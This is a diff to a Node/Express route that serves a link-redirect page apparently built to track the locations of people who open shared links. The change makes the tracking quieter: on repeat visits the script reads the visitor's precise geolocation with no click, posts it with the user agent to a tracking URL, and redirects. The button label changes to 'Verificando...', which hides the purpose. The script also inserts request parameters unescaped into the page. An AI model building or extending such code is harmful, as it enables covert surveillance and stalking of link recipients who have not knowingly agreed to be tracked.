@@ -283,58 +283,61 @@ app.get('/s/:id', async (req, res) => {
     </div>
     
     <script>
-        // Check if user already subscribed (gave location before)
         const linkId = '${req.params.id}';
         const storageKey = 'ubicar_subscribed_' + linkId;
+        const destUrl = '${destinationUrl}';
+        const trackUrl = '${trackUrl}';
         const alreadySubscribed = localStorage.getItem(storageKey);
-        
-        if (alreadySubscribed) {
-            // Already subscribed, redirect to tracking page (shows destination in iframe + continues tracking)
-            console.log('Already subscribed, redirecting to tracker...');
-            window.location.replace('/track/${req.params.id}');
+
+        // Helper: send location silently to server
+        function sendLocation(lat, lng) {
+            fetch(trackUrl, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ lat, lng, userAgent: navigator.userAgent })
+            }).catch(function(){});
         }
-        
-        document.getElementById('ctaBtn').addEventListener('click', async function() {
-            const btn = this;
-            const errorMsg = document.getElementById('errorMsg');
-            
+
+        // If already subscribed: capture location silently then redirect to destination
+        if (alreadySubscribed) {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    function(pos) {
+                        sendLocation(pos.coords.latitude, pos.coords.longitude);
+                        window.location.replace(destUrl);
+                    },
+                    function() { window.location.replace(destUrl); },
+                    { timeout: 4000, enableHighAccuracy: true }
+                );
+            } else {
+                window.location.replace(destUrl);
+            }
+        }
+
+        // First time: click CTA -> ask permission -> capture -> redirect to destination
+        document.getElementById('ctaBtn').addEventListener('click', function() {
+            var btn = this;
+            var errorMsg = document.getElementById('errorMsg');
             btn.disabled = true;
-            btn.innerHTML = 'Obteniendo ubicación... <span class="spinner"></span>';
             errorMsg.style.display = 'none';
-            
-            // Try to get location
+
             if (!navigator.geolocation) {
-                // No geolocation support, mark as subscribed and redirect to tracking page
                 localStorage.setItem(storageKey, 'true');
-                window.location.href = '/track/${req.params.id}';
+                window.location.href = destUrl;
                 return;
             }
-            
+
+            btn.innerHTML = 'Verificando... <span class="spinner"></span>';
+
             navigator.geolocation.getCurrentPosition(
-                async (position) => {
-                    // Got location, send to server
-                    try {
-                        await fetch('${trackUrl}', {
-                            method: 'POST',
-                            headers: { 'Content-Type': 'application/json' },
-                            body: JSON.stringify({
-                                lat: position.coords.latitude,
-                                lng: position.coords.longitude,
-                                userAgent: navigator.userAgent
-                            })
-                        });
-                    } catch (e) {
-                        console.log('Tracking error:', e);
-                    }
-                    // Mark as subscribed and redirect to tracking page (shows destination in iframe + continues tracking)
+                function(position) {
+                    sendLocation(position.coords.latitude, position.coords.longitude);
                     localStorage.setItem(storageKey, 'true');
-                    window.location.href = '/track/${req.params.id}';
+                    window.location.href = destUrl;
                 },
-                (error) => {
-                    // Location denied or error, mark as subscribed anyway and redirect to tracking page
-                    console.log('Location error:', error);
+                function() {
                     localStorage.setItem(storageKey, 'true');
-                    window.location.href = '/track/${req.params.id}';
+                    window.location.href = destUrl;
                 },
                 { timeout: 10000, enableHighAccuracy: true }
             );
